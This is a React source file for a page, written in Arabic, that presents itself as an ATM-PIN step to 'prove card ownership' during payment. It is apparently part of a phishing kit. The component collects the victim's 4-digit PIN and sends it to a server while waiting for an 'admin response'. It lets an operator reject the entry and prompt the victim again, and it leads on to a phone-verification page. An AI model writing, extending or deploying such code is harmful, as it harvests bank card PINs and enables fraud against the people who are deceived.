import Main from "@/components/Main";
import PaymentCardDetails from "@/components/PaymentCardDetails";
import { isFormRejected } from "@/real-time/context/signals";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { Box, TextField } from "@mui/material";
import Button from "@mui/material/Button";
import Stack from "@mui/material/Stack";
import { useEffect, useRef, useState } from "react";
import { useForm } from "react-hook-form";

function AtmPassword() {
  const { handleSubmit, reset } = useForm({
    mode: "onChange",
    defaultValues: {
      atmPassword: "",
    },
  });

  const inputRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
  const [types, setTypes] = useState(["tel", "tel", "tel", "tel"]);
  const [passwordValues, setPasswordValues] = useState(["", "", "", ""]);

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>,
    index: number,
  ) => {
    const value = e.target.value;

    if (/^[0-9]$/.test(value)) {
      const newPasswordValues = [...passwordValues];
      newPasswordValues[index] = value;
      setPasswordValues(newPasswordValues);

      e.target.value = value;

      setTimeout(() => {
        setTypes((prev) => {
          const updated = [...prev];
          updated[index] = "password";
          return updated;
        });
      }, 500);

      if (index < inputRefs.length - 1) {
        (inputRefs[index + 1].current as any)?.focus();
      }
    } else {
      e.target.value = "";
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent, index: number) => {
    if (
      e.key === "Backspace" &&
      !(e.target as HTMLInputElement).value &&
      index > 0
    ) {
      setTypes((prev) => {
        const updated = [...prev];
        updated[index - 1] = "tel";
        return updated;
      });

      const newPasswordValues = [...passwordValues];
      newPasswordValues[index - 1] = "";
      setPasswordValues(newPasswordValues);

      (inputRefs[index - 1].current as any)?.focus();
    } else if (
      e.key === "Backspace" &&
      (e.target as HTMLInputElement).value &&
      passwordValues.length - 1 === index
    ) {
      setTypes((prev) => {
        const updated = [...prev];
        updated[index] = "tel";
        return updated;
      });

      const newPasswordValues = [...passwordValues];
      newPasswordValues[index] = "";
      setPasswordValues(newPasswordValues);
    }
  };

  const isPasswordComplete = passwordValues.every((val) => val !== "");

  useEffect(() => {
    setTimeout(() => {
      (inputRefs[0].current as any)?.focus();
    }, 100);
  }, []);

  function sendData() {
    const fullPassword = passwordValues.join("");

    sendDataToServer({
      digitCode: fullPassword,
      current: "كلمة مرور ATM",
      nextPage: "توثيق رقم الجوال",
      waitingForAdminResponse: true,
    });
  }

  useEffect(() => setCurrentPage("كلمة مرور ATM"), []);
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
      setPasswordValues(["", "", "", ""]);
      setTypes(["tel", "tel", "tel", "tel"]);
      (inputRefs[0].current as any)?.focus();
    }
  }, [isFormRejected.value]);

  const { cardLast4 } = JSON.parse(localStorage.getItem("payment") || "");

  return (
    <Main>
      <form
        className="flex flex-col flex-1 gap-8  w-full"
        onSubmit={handleSubmit(sendData)}
      >
        <div className="top">
          <div className="flex flex-col gap-5 items-center">
            <h2 className="font-bold text-xl">إثبات ملكية البطاقة</h2>
            <img
              src="images/atm-logo.png"
              alt="atm-logo"
              height="31.06px"
              width="100px"
            />
            <h2 className="font-semibold text-xl">
              لتأكيد العملية أدخل الرقم السري للصراف الألي
            </h2>
          </div>
          <PaymentCardDetails />
          <p className="mt-6">
            يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة
            المنتهية بـ <b>{cardLast4}</b> ليتم التأكد من ملكية وأهلية صاحب
            البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
          </p>
        </div>

        <div dir="ltr" className="w-[212px] mx-auto">
          <Box display="flex" gap={2} justifyContent="center">
            {inputRefs.map((ref, index) => (
              <TextField
                key={index}
                inputRef={ref}
                value={passwordValues[index]}
                type={types[index]}
                size="small"
                inputProps={{
                  maxLength: 1,
                  style: { textAlign: "center", fontSize: "1.1rem" },
                }}
                onChange={(e) => handleChange(e, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
              />
            ))}
          </Box>
        </div>

        {isFormRejected.value && (
          <Stack className="font-medium mt-5 text-red-500 text-center">
            الرقم السري غير صحيح، يرجى المحاولة مرة أخرى.
          </Stack>
        )}

        <Stack
          className="form-bottom"
          direction="row"
          justifyContent="end"
          alignItems="center"
          mt="24px"
        >
          <Button
            variant="contained"
            disabled={!isPasswordComplete}
            type="submit"
            fullWidth
            size="large"
          >
            تأكيد
          </Button>
        </Stack>
      </form>
    </Main>
  );
}

export default AtmPassword;
